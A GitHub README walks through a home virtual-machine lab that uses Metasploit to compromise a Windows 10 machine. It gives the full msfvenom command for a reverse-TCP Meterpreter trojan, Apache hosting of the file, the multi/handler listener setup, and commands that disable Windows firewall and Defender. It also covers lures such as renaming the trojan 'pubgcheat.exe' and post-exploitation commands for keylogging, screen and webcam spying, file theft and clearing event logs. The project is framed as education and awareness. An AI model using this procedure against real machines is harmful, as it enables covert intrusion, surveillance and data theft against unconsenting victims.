# Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking

<h2>Description</h2>
This project is based on the vulnerability and probabilities of consequences that a normal windows user can can face in case of simple mistake or involvement with unknown setup activities via internet. In this project we will be using two virtual machines. Kali Linux and Windows.
Here,Kali Linux will be used to hack the windows machine. And we will be performing all the activities inside the virtual machine so that the malware that we will be creating inside the kali linux virtual machine won’t escape the environment and won’t contaminate our own system. 
<br />


<h2>Languages and Utilities Used</h2>

- <b>Metasploit Framework</b>
- <b>Meterpreter</b>
- <b>Bash Scripting</b>
- <b>Reverse Shell Engineering</b>



<h2>Environments Used </h2>

- <b>Oracle VM box</b> 
- <b>Kali Linux</b>
- <b>Windows 10 Pro</b>

<h2>Setup Walk Through </h2>

- <b>Two Virtual machines setup with Kali Linux and Windows 10 Pro.</b> 
- <b>Building own simple virus via Metasploit framework.</b>
- <b>Sharing the malware.</b>
- <b>Listening of the torjan from windows machine.</b>
- <b>Infecting windows.</b>
- <b>Consequences studies. Taking control over the windows machine via Kali linux</b>



<p align="left">
<br/> Step 1: Virtual machine setup.<br/>

So, we first need to setup the two virtual machine in a virtual box and run both of them parallel. One machine should be running Kali Linux (our attacker) and the other should be running windows 10 pro.

![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/614da26c-6ef7-47c0-9f80-ee03d197746f)

Fig: installation of kali Linux after the installation of windows system inside the same virtual box.


![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/93e8d481-cd04-4183-822e-ec1000ca5b11)

Here, we can rename the kali machine as attacker so that it will be easier later for the demonstration of the project.
For now, the machine has following username and password.
Username: attacker
password: attacker

We can define the username and password as per the preference.

Finally this way, we need to get two of our machines ready. 

![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/c98ab36c-b8b4-4f7a-86be-86c93d8909cd)


<br/> Step 2: Creating a malware <br/>

For malware, we will be just creating a small file in .exe format which is executable in windows. And the script will open the meterpreter in the windows machine which will be calling the IP of attacker machine to run the script. 

For this, we are going to use the metasploit framework. So lets first open the metasploit framwork in the attacker machine (Kali linux).

Just click on the kali menu and type metasploit framework and start it. A window of metasploit will open. With msf6 written on it. It simply means MetaSploit Framework Version 6.


![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/8d885c5f-e566-46bd-9436-088bfcc3517c)



Just type the attacker as password that we created before in the password section.


![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/29575cac-8ce4-4327-b3c7-3d5dcd1d0d30)



First thing is, we need to check if the machine is connected with the public network or not. So that we will be able to reach the windows machine. For that, just need to type the command ip addr and check the IP address in the inet part of eth0.
If the IP address begins with 10.0.9.x, then we can confirm the machine is in public network.

![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/bbcf12d8-9446-4986-b75c-9652ee396fec)



After that, we can proceed forward to creating a malware. For that just need to run the following two lines in msfv6 by changing the .x of LHOST with the machine IP. As stated before, this two line is creating a malware with the help of msfv6 which opens the meterpreter shell, an interface which will provide us the command line shell to control the windows later.

Msfv6 command:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.9.15 -f exe -o ~/Desktop/Virus.exe




here, 
-p refers to payload switch. And here payload is used from the framework database which is created for windows machine to do the reverse shell.
LHOST is the machine where the virus/ trojan should call.
-f refers to format of the file. We selected .exe because it is executable in windows.
-o means output. For now, we want that file in our desktop and the name of the file is Virus.exe.

![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/79b3d5c3-db6c-4d8b-8ad7-b46375a36ac2)


After running this command, we should be able to see a file created on the desktop of the attacker machine. The name of the file will be virus.exe.

![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/8c5bb6c3-3dde-4468-9c98-151fb83c820c)



<br/> Step 3: Sharing the malware <br/>

The next step is to put the malware in the windows machine. It can be done by several ways. For example, we can trick the window user for downloading some files from website. For example, if the user is pubg addict, we can rename our virus as pubgcheat.exe and attract the user to click download and execute the file. Social engineering can be used or other various ways are possible to perform this transfer. 
But for now, in this project we will be using apache service of our attacker machine to make it available through the web. Such that windows machine will be downloading it. We wont be using any email services to put our virus, because most of the email services now have the filtration capabilities.



So lets go again to the msfconsole of attacker.
I) creating a directory in the machine to share file on the web. This directory will be available via web.

Command:
sudo mkdir /var/www/html/share

this command will be creating share directory on the defined path.



![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/dbbbf791-13d5-42a3-8c87-b690b332fdd2)











We can see there is share directory present in the defined path. Now we can just copy our virus to this directory.

II) Copy and paste or move our virus file to that same directory.
Command:
sudo cp ~/Desktop/virus.exe /var/www/html/share






![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/b54a1863-099e-47e1-a045-96c6f441ea96)









III) Start the apache web server application.

Command: sudo service apache2 start



IV) confirmation of hosting can be done by opening  the web browser in the attacker machine and call the IP address and specific directory in our machine, which is 10.0.2.15/share in our case.

![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/526b2a09-aad1-456b-8ee8-1f80540ea268)

So now keeping the attacker machine running, we can also call this ip in victim/ target windows browser to get that virus.exe file.



<br/> Step 4: Setting the Kali/ attacker machine ready to listen (Phoning home) <br/>

To get the attacker machine ready to listen whenever a victim is active or got connected with the machine, we run few commands on the msfv6 console.

    • First we will use the handler of msfv6 so that we will be able to handle multiple machines too. This virus can be sent on internet and multiple victims can download it, our attacker machine should be prepare to listen and handle multiple machines. For that, 
      Command: use exploit/multi/handler
    • Now we need to tell the metasploit which payload we are using, and for what msf should stay in the listening mode. For that,
      Command: set PAYLOAD windows/meterpreter/reverse_tcp
    • Thirdly we should define the IP address to indicate the local host where the connection will be coming in. In our case, it is 10.0.2.15. For that,
      Command: set LHOST 10.0.9.15
    • And then lauch the exploit.
      Command: exploit -j
      -j command is to indicate background. Here, -j is telling metasploit to run the handler in the background, so that metasploit will be free for us for now to do other things which its listening to any probable victims in background.


![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/f4a9afe7-4308-4530-a199-7ed1945da59c)


<br/> Step 5: Infecting the windows machine <br/>
Now, for the further steps, lets disable some firewall features of the windows to make this project easy going for us. In real life also, in case of desperate use of the file, the target can be manipulated enough to download the virus anyway.

So to make the system firewall weak for now to get the easy download on our victim machine. Just go to cmd as administrator and type the following command.

Command : netsh advfirewall set allprofiles state off

![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/827b636a-8e2e-47de-bff3-56bd42158f97)



Next we also turn off the Windows Defender. For that, we type virus in the search bar and open Virus & threat protection settings> manage setting and turn Real-time and Cloud-delivered protection off.



After this, I have restarted both of the machine. We can do that to practice the whole thing again because next step will begin our windows machine infection.

So after restarting both of the machine. 
Checking the IP address of the kali/ attacker machine, same as before.

![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/a1dc436f-ae01-4290-a4d4-a0169d29c698)



With all the previous setup of making the msfv6 console ready for the listening and starting the apache server in the kali/ attacker machine, we can download the file from the windows machine.








![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/2156a3be-db8d-4c95-b1f2-f13cd78adb71)















Now, we just need to download the virus from the browser by calling our hosted server. And we execute it in our windows machine. For that, we will go to the browser of our windows machine and type: 10.0.2.15/share







![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/7e8488ea-d4ea-4d3c-b5f8-240fb781f1ea)











Now just need to double click and execute the file in windows. 

Note: Make sure you create the new virus file with the present IP to make it successful.

Nothing will appear in the windows machine however, the metasploit will open the meterpreter in kali/ attacker machine which can run the commands as per needed.

You should see something like this:


![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/b82c01ce-c66d-456b-ada4-71ddd5b188e7)








<br/> Step 6: Starting to control <br/>

Press enter and type command: sessions to see which system are connected at the moment.

![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/ace0d3a2-72aa-4931-b386-67851b5065f4)


Now as we can see there is one session connected. We can do many things by starting to use that session. 

For that, we have the session ID as 1 so.
Command: sessions -i 1


![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/dae27a99-e3de-4a85-9269-020b0a732b4b)


Now, meterpreter is open. We can use the commands to see and handle things in the victim desktop. To verify lets run. 

Pwd command to find out the present directory and lets go the desktop where we have our file downloaded in the victim machine. We can also create a new folder in the windows machine desktop and see if it can be visible through our kali/attacker machine..

![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/53364c46-b184-4e36-aa83-9156b5642057)


Now lets go the attacker machine kali and verify things.


![image](https://github.com/swopnilshakya7/Taking-Control-Over-Windows-Machine-Metasploit-Ethical-Hacking/assets/140642619/6ac88de5-c3dc-4976-a4a3-15a9f52eb4a7)


Here, the newly created folder is easily visible. Now the scopes are extremely huge by taking the total control of the machine. To view the commands that can be run via meterpreter to control the window/ victim machine, we can just type help.
It will list more than 100 commands from which most useful ones can be:
- clearev: this command clear the event logs and remove our footprinting.
- enumdesktops: List all accessible desktops and window stations
- screenshot: grab the current screenshot
- screenshare: watch the remote user’s desktop in real time

webcam commands:
- record_mic: Record audio from the default microphone for x seconds
- webcam_chat: Start a video chat
- webcam_list: List webcams
- webcam_snap: Take a snapshot from the specified webcam

We can even open the shell of the windows machine by just commanding: shell , in meterpreter.











<h4> Scopes for hackers | Consequences for victims </h4>

1.  View and upload files</br>

    To view and surf through the machine and different directories. Popular commands are</br>

    cd: change directory</br>
    ls: list the contents of that particular directory</br>
    pwd: print working directory</br>

    To upload files in the victim machine, we can simply use the upload command</br>
    upload /home/attacker/Desktop/virusnew.exe</br>

    This command will simply upload the virus.exe file from the attackers computer to the present working directory of the victim machine. Note that, attacker is the name of our attacker machine here in our example.



2.  Download files from the victims computer.</br>
    We can use download command to download a file from the victim machine. And cat command to open it.


3.  Viewing the screen
    By doing the command:</br>
    screenshot -v true</br>
    screenshot of the current screen of the victim window can be taken. A popup will come in front.
    Even we can continously watch the screen by the command:</br>
    screenshare</br>
    a player will start and screen will get shared.


4.  Keystrokes logging</br>
    To start recording the key strokes, the command is:</br>
    keyscan_start</br>
    and to dump the recorded commands so far:</br>
    keyscan_dump</br>
    In the dump <cr> refers to carriage return or it is the enter key pressed.


5.  Syping with webcam
    For this lab project, we need to give access to the camera for our virtual machine. To do that, we need to go to Machine>Settings>Ports. Select USB and checkbox enable USB Controller. Restart the VM, turn off the defenders and go to Devices>Webcams and select the name of webcam.


    Now, we can spy through the webcam with the following commands in meterpreter.</br>

    Command: webcam_list</br>
    this will show the available webcam on that machine.
    We just need to type this command to open and view the webcam.</br>
    Command:  webcam_stream</br>

    meterpreter will open the firefox and stream video.

Note: So for safety, we should always cover or tape our webcam of laptop or external USB device.



<h3>Disclaimer: This project is for educational purpose only.</h3>

<h3>Key Takeaway: </h3>
  This project is to create awareness about the ease of hacking and taking control over the digital system. With a simple mistake of downloading a simple malware by clicking the vulnerable links, one can get victimized to very high extent.

<p align="left">
